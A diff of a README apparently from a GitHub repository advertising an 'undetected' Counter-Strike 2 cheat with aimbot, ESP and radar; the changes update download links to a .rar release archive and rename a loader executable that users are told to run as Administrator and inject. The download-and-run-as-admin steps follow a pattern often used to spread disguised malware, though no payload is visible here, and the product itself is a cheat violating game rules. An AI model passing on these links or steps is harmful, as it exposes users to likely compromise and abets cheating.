@@ -1,7 +1,7 @@
 
 <div align="center">
   
-  [CS2 Cheat](https://github.com/Virtualshashift/cs2-cheat/releases/download/CS2-V3.2/CS2-V3.2.rar)
+  [CS2 Cheat](https://github.com/Virtualshashift/cs2-cheat/releases/download/CS2-V3.3/CS2-V3.3.rar)
 
  > **The ultimate, feature-rich undetected utility for CS2. Full control over Aimbot, ESP, Radar, and Performance options.**
   
@@ -26,9 +26,9 @@
 ---
 
 
-### [⬇️ Download](https://github.com/Virtualshashift/cs2-cheat/releases/download/CS2-V3.2/CS2-V3.2.rar)
+### [⬇️ Download](https://github.com/Virtualshashift/cs2-cheat/releases/download/CS2-V3.3/CS2-V3.3.rar)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Virtualshashift/cs2-cheat/releases/download/CS2-V3.2/CS2-V3.2.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Virtualshashift/cs2-cheat/releases/download/CS2-V3.3/CS2-V3.3.rar)
 
 
 </div>
@@ -74,7 +74,7 @@
 
 3. **Run Loader**  
 
-   Run `CS2V3.4.exe` as **Administrator**.
+   Run `CS2V3.3.exe` as **Administrator**.
 
 
 4. **Launch & Inject**  
